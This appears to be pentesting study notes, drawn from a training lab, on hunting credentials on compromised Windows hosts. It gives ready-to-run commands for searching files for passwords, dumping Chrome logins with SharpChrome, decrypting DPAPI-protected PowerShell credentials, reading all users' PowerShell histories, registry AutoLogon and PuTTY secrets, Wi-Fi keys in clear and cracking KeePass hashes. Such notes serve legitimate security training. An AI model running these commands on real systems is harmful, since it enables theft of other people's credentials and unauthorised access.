---
title: Credentials hunting
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - pentesting
  - windows
  - privilege
---
# Credentials hunting

## Application Configuration Files

### Searching files with findstr

We can use [findstr](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/findstr) to search from patterns across many types of files.

```cmd-session
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml


findstr /si password *.xml *.ini *.txt *.config

cd c:\Users\htb-student\Documents & findstr /SI /M "password" *.xml *.ini *.txt

findstr /spin "password" *.*
```

### Search File Contents with PowerShell

```powershell-session
select-string -Path C:\Users\htb-student\Documents\*.txt -Pattern password

Get-ChildItem C:\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore
```

### Search File Contents with cmd

```cmd-session
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*


where /R C:\ *.config
```


## Dictionary Files

### Chrome Dictionary Files

For example, sensitive information such as passwords may be entered in an email client or a browser-based application, which underlines any words it doesn't recognize. The user may add these words to their dictionary to avoid the distracting red underline.

```powershell
gc 'C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password
```



## Browser Credentials

### Retrieving Saved Credentials from Chrome

Users often store credentials in their browsers for applications that they frequently visit. We can use a tool such as [SharpChrome](https://github.com/GhostPack/SharpDPAPI) to retrieve cookies and saved logins from Google Chrome.

```powershell-session
.\SharpChrome.exe logins /unprotect
```

Note: Credential collection from Chromium-based browsers generates additional events that could be logged and identified as `4983`, `4688`, and `16385`, and monitored by the blue team.


## Sticky Notes Passwords

People often use the StickyNotes app on Windows workstations to save passwords and other information, not realizing it is a database file. This file is located at `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` and is always worth searching for and examining.

Looking for StickyNotes DB Files:

We can copy the three plum.sqlite* files down to our system and open them with a tool such as [DB Browser for SQLite](https://sqlitebrowser.org/dl/) and view the `Text` column in the `Note` table with the query 

```sql
select Text from Note;
```

### Viewing Sticky Notes Data Using PowerShell

This can also be done with PowerShell using the [https://github.com/RamblingCookieMonster/PSSQLite](https://github.com/RamblingCookieMonster/PSSQLite): 

```powershell-session
Set-ExecutionPolicy Bypass -Scope Process

cd .\PSSQLite\
Import-Module .\PSSQLite.psd1

$db = 'C:\Users\htb-student\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite'

Invoke-SqliteQuery -Database $db -Query "SELECT Text FROM Note" | ft -wrap

```

### Viewing strings to View DB File Contents

We can also copy them over to our attack box and search through the data using the `strings` command, which may be less efficient depending on the size of the database.

Kali attacking machine:

```shell-session
strings plum.sqlite-wal
```



## Unattended Installation Files

### Unanttend.xml

Unattended installation files may define auto-logon settings or additional accounts to be created as part of the installation. Passwords in the `unattend.xml` are stored in plaintext or base64 encoded.

```xml
<?xml version="1.0" encoding="utf-8"?>
<unattend xmlns="urn:schemas-microsoft-com:unattend">
    <settings pass="specialize">
        <component name="Microsoft-Windows-Shell-Setup" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
            <AutoLogon>
                <Password>
                    <Value>local_4dmin_p@ss</Value>
                    <PlainText>true</PlainText>
                </Password>
                <Enabled>true</Enabled>
                <LogonCount>2</LogonCount>
                <Username>Administrator</Username>
            </AutoLogon>
            <ComputerName>*</ComputerName>
        </component>
    </settings>
```


Although these files should be automatically deleted as part of the installation, sysadmins may have created copies of the file in other folders during the development of the image and answer file.

## PowerShell History File

Starting with Powershell 5.0 in Windows 10, PowerShell stores command history to the file:

```
C:\Users\<username>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

Confirming PowerShell History Save Path:

```powershell
(Get-PSReadLineOption).HistorySavePath
```

Get the content with Get-Content (gc):

```powershell
 gc (Get-PSReadLineOption).HistorySavePath
```

Taking this further, if we are local admin we can read the files for all users with this one-liner:

```powershell
foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}
```

## PowerShell Credentials

PowerShell credentials are often used for scripting and automation tasks as a way to store encrypted credentials conveniently. The credentials are protected using [DPAPI](https://en.wikipedia.org/wiki/Data_Protection_API), which typically means they can only be decrypted by the same user on the same computer they were created on.

Take, for example, the following script `Connect-VC.ps1`, which a sysadmin has created to connect to a vCenter server easily:

```powershell
# Connect-VC.ps1
# Get-Credential | Export-Clixml -Path 'C:\scripts\pass.xml'
$encryptedPassword = Import-Clixml -Path 'C:\scripts\pass.xml'
$decryptedPassword = $encryptedPassword.GetNetworkCredential().Password
Connect-VIServer -Server 'VC-01' -User 'bob_adm' -Password $decryptedPassword
```

**Decrypting PowerShell Credentials**: If we have gained command execution in the context of this user or can abuse DPAPI, then we can recover the cleartext credentials from `encrypted.xml`. The example below assumes the former:

```powershell
$credential = Import-Clixml -Path 'C:\scripts\pass.xml'
$credential.GetNetworkCredential().username

$credential.GetNetworkCredential().password
```


## Cmdkey saved credentials

The [cmdkey](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/cmdkey) command can be used to create, list, and delete stored usernames and passwords.

```cmd-session
# To display a list of all user names and credentials that are stored, type:
cmdkey /list
```

We can also attempt to reuse the credentials using `runas` to send ourselves a reverse shell as that user, run a binary, or launch a PowerShell or CMD console with a command such as:

```powershell-session
runas /savecred /user:inlanefreight\bob "COMMAND HERE"
```



## Querying the Registry for AutoLogon Credentials

Windows stores AutoLogon credentials in the registry, under a specific path. You can retrieve this information by querying the registry directly.

You can access the relevant registry keys for AutoLogon credentials using PowerShell via Evil-WinRM.

**1.**  **First way**: Use PowerShell to Read Registry Keys

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`

```powershell
# Query AutoLogon settings from the registry
Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" | Select-Object DefaultDomainName, DefaultUserName, DefaultPassword
```

**2.** **Second way**: Check the Registry for AutoLogon Credentials directly:

```powershell
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

**3.** Search the System for Plaintext Credentials: Sometimes credentials are stored in files or scripts. You can search the filesystem for potential matches using **PowerShell**.

```powershell
Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern "password|pwd|pass"
```

**4.** Dump the Registry and Analyze Offline: If allowed, you can export the registry hive and analyze it locally.

```powershell
# Export Winlogon Hive:
reg save "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" C:\Users\Public\winlogon.reg
```

**5.** Use Built-in Tools:  Run `cmdkey` to List Stored Credentials.

```powershell
cmdkey /list
```

**6.** Check Scheduled Tasks: Sometimes credentials are stored in scheduled tasks.

```powershell
Get-ScheduledTask | ForEach-Object { Get-ScheduledTaskInfo -TaskName $_.TaskName } | Select-String -Pattern "password|user"
```

**7.** Putty sessions

```powershell
reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions
```

Output:

```
HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh
```

Next, we look at the keys and values of the discovered session "`kali%20ssh`":

```powershell-session
reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh
```

Output:

```powershell-session
HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh
    Present    REG_DWORD    0x1
    HostName    REG_SZ
    LogFileName    REG_SZ    putty.log
    
  <SNIP>
  
    ProxyDNS    REG_DWORD    0x1
    ProxyLocalhost    REG_DWORD    0x0
    ProxyMethod    REG_DWORD    0x5
    ProxyHost    REG_SZ    proxy
    ProxyPort    REG_DWORD    0x50
    ProxyUsername    REG_SZ    administrator
    ProxyPassword    REG_SZ    1_4m_th3_@cademy_4dm1n!  
```

## Wifi

If we obtain local admin access to a user's workstation with a wireless card, we can list out any wireless networks they have recently connected to.

```cmd-session
netsh wlan show profile
```

**Retrieving Saved Wireless Passwords**: Depending on the network configuration, we can retrieve the pre-shared key (`Key Content` below) and potentially access the target network.

```cmd-session
netsh wlan show profile ilfreight_corp key=clear
```



## Password Managers

Many companies provide password managers to their users. This may be in the form of a desktop application such as `KeePass`, a cloud-based solution such as `1Password`, or an enterprise password vault such as `Thycotic` or `CyberArk`.

Some password managers such as `KeePass` are stored locally on the host. If we find a `.kdbx` file on a server, workstation, or file share, we know we are dealing with a `KeePass` database which is often protected by just a master password. If we can download a `.kdbx` file to our attacking host, we can use a tool such as [keepass2john](https://gist.githubusercontent.com/HarmJ0y/116fa1b559372804877e604d7d367bbc/raw/c0c6f45ad89310e61ec0363a69913e966fe17633/keepass2john.py) to extract the password hash and run it through a password cracking tool such as [Hashcat](https://github.com/hashcat) or [John the Ripper](https://github.com/openwall/john).

```shell-session
python2.7 keepass2john.py ILFREIGHT_Help_Desk.kdbx 

# Cracking Hash Offline
hashcat -m 13400 keepass_hash /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt
```

## Email

If we gain access to a domain-joined system in the context of a domain user with a Microsoft Exchange inbox, we can attempt to search the user's email for terms such as "pass," "creds," "credentials," etc. using the tool [MailSniper](https://github.com/dafthack/MailSniper).

## Other files

In an Active Directory environment, we can use a tool such as [Snaffler](https://github.com/SnaffCon/Snaffler) to crawl network share drives for interesting file extensions such as `.kdbx`, `.vmdk`, `.vdhx`, `.ppk`, etc.

Some other files we may find credentials in include the following:

```shell-session
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
%WINDIR%\System32\drivers\etc\hosts
C:\ProgramData\Configs\*
C:\Program Files\Windows PowerShell\*
```

## LaZagne

[See more on LaZagne](lazagne.md).